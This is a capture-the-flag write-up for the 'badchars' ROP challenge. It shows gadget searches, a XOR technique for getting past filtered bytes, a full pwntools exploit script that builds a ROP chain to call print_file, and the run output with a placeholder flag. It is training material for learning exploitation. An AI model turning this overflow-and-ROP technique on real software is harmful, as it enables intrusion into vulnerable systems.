# Writeup: badchars

## Introduction

In this challenge we are told we have to avoid bad characters. Bad characters are characters that will get corrupted if sent without any changes to the binary before getting to their destination in the binary corrupting any payload we may send. To avoid this we will be using xor to change the contents of the payload so that we can avoid any bad characters and then once inside the binary we will be using an xor gadget and the key we used to change the contents of the payload to change it back to the intended payload thus avoiding any possible corruption.

## Found Gadgets
```
    $ ROPgadget --binary ./badchars | grep "xor"
    0x0000000000400628 : xor byte ptr [r15], r14b ; ret
```

```
    ROPgadget --binary ./badchars | grep "mov"
    ...
    0x0000000000400634 : mov qword ptr [r13], r12 ; ret
    ...
```

```
    $ ROPgadget --binary ./badchars | grep "pop rdi"
    0x00000000004006a3 : pop rdi ; ret
```

```
    $ ROPgadget --binary ./badchars | grep "pop r14"
    0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
```

With all of these gadgets we will be able to construct our payload, let me explain. First we will load up all of the registers with the appropriate values r12 will be loaded with the encoded string, r13 will be loaded with the address of the bss section, r14 will be loaded with the key to decode the encoded string, and r15 will be loaded with the address of the bss secton. We will first use the pop r12 through r15 instruction to load all of the registers as I laid out then we will use the mov instruction to load the encoded string into the bss section. Once done then we will loop through each byte of the encoded string in the bss section and xor it with the key. Next we will put the address of the bss section on the stack and then pop it into rdi so that we can pass the string into the print file function, the address of which will come next. With all of that laid out we can write the script. I should note that not just any key will work so in order to figure out what key will help me avoid all of the bad chars I wrote a for loop that checks to see if after encoding the string there are still bad chars in the string. After a few tries I got the right key which you will see below.

## Results

```
    from pwn import *

    p = process('./badchars')

    e = ELF('./badchars')

    rop = ROP(e)
    BSS = e.bss()
    XOR = 0x0000000000400628 # xor byte ptr [r15], r14b ; ret
    POP_RDI = 0x00000000004006a3 # pop rdi ; ret
    MOV = 0x0000000000400634 # mov qword ptr [r13], r12 ; ret
    print_file = e.sym['print_file']
    POP_ALL = 0x000000000040069c # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

    key = 0x23
    encoded = bytes([b ^ key for b in b'flag.txt'])

    p.recvuntil(b': ')
    output = p.recvuntil(b'> ')
    badchars = [chr(b[1]) for b in output.strip().split(b', ')]

    for c in encoded:
        if chr(c) in badchars:
            sys.exit(1)

    padding = b'A' * 40

    payload = padding + p64(POP_ALL) + p64(u64(encoded)) + p64(BSS) + p64(key) + p64(BSS) + p64(MOV)
    
    for i in range(8):
        payload += p64(POP_ALL)
        payload += p64(0)
        payload += p64(0)
        payload += p64(key)
        payload += p64(BSS + i)
        payload += p64(XOR)

    payload += p64(POP_RDI) + p64(BSS) + p64(print_file)

    p.sendline(payload)

    p.interactive()
```

Now all that is left is to run the script and obtain the flag.

```
    [+] Starting local process './badchars': pid 53405
    [*] '/mnt/c/Users/18506/Desktop/CTF/badchars/badchars'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
        RUNPATH:  b'.'
    [*] Loaded 13 cached gadgets for './badchars'
    b'#\x00\x00\x00\x00\x00\x00\x00'
    [*] Switching to interactive mode
    Thank you!
    ROPE{a_placeholder_32byte_flag!}
    [*] Got EOF while reading in interactive
    $
    [*] Process './badchars' stopped with exit code -11 (SIGSEGV) (pid 53405)
    [*] Got EOF while sending in interactive
```

Finally, we have our flag:

`ROPE{a_placeholder_32byte_flag!}` 
